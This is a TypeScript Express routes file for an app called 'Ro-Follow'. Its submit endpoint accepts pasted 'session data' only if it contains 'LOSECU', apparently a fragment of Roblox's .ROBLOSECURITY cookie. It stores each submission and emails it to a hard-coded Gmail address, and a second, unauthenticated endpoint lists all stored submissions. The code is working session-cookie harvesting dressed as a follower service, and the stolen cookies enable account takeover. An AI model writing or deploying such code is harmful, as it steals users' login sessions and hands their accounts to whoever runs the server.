import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertSubmissionSchema } from "@shared/schema";
import { z } from "zod";
import nodemailer from "nodemailer";

// Email configuration
const createTransporter = () => {
  // Use environment variables for email configuration
  const emailUser = process.env.EMAIL_USER || process.env.SMTP_USER;
  const emailPass = process.env.EMAIL_PASS || process.env.SMTP_PASS;
  const emailHost = process.env.EMAIL_HOST || process.env.SMTP_HOST || "smtp.gmail.com";
  const emailPort = parseInt(process.env.EMAIL_PORT || process.env.SMTP_PORT || "587");

  return nodemailer.createTransport({
    host: emailHost,
    port: emailPort,
    secure: emailPort === 465,
    auth: {
      user: emailUser,
      pass: emailPass,
    },
  });
};

const sendEmail = async (sessionData: string) => {
  const transporter = createTransporter();
  
  const mailOptions = {
    from: process.env.EMAIL_USER || process.env.SMTP_USER,
    to: "loxlox999000@gmail.com",
    subject: "New Ro-Follow Session Data Submission",
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
        <h2 style="color: #8b5cf6; text-align: center;">New Session Data Submission</h2>
        <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <h3 style="color: #333; margin-top: 0;">Session Data:</h3>
          <pre style="background-color: #1a1a1a; color: #ffffff; padding: 15px; border-radius: 4px; overflow-x: auto; font-size: 12px; line-height: 1.4;">${sessionData}</pre>
        </div>
        <p style="color: #666; font-size: 14px; text-align: center;">
          Submitted on: ${new Date().toLocaleString()}
        </p>
        <hr style="margin: 20px 0; border: none; border-top: 1px solid #eee;">
        <p style="color: #999; font-size: 12px; text-align: center;">
          This email was sent automatically from the Ro-Follow application.
        </p>
      </div>
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log("Email sent successfully to loxlox999000@gmail.com");
  } catch (error) {
    console.error("Error sending email:", error);
    throw new Error("Failed to send email notification");
  }
};

const validateSessionData = (data: string) => {
  const requiredString = 'LOSECU';
  return data.includes(requiredString);
};

const submissionSchema = z.object({
  sessionData: z.string().min(1, "Session data is required").refine(
    validateSessionData,
    "Invalid Paste"
  ),
});

export async function registerRoutes(app: Express): Promise<Server> {
  // Submit session data endpoint
  app.post("/api/submit-session", async (req, res) => {
    try {
      const validatedData = submissionSchema.parse(req.body);
      
      // Store the submission
      const submission = await storage.createSubmission({
        sessionData: validatedData.sessionData,
        email: "loxlox999000@gmail.com",
      });

      // Send email notification
      await sendEmail(validatedData.sessionData);

      res.json({ 
        success: true, 
        message: "Session data submitted successfully",
        submissionId: submission.id,
      });
    } catch (error) {
      console.error("Error processing submission:", error);
      
      if (error instanceof z.ZodError) {
        return res.status(400).json({
          success: false,
          message: error.errors[0]?.message || "Invalid session data format",
        });
      }

      res.status(500).json({
        success: false,
        message: error instanceof Error ? error.message : "Internal server error",
      });
    }
  });

  // Get all submissions endpoint (for admin/debugging)
  app.get("/api/submissions", async (req, res) => {
    try {
      const submissions = await storage.getAllSubmissions();
      res.json(submissions);
    } catch (error) {
      console.error("Error fetching submissions:", error);
      res.status(500).json({
        success: false,
        message: "Failed to fetch submissions",
      });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
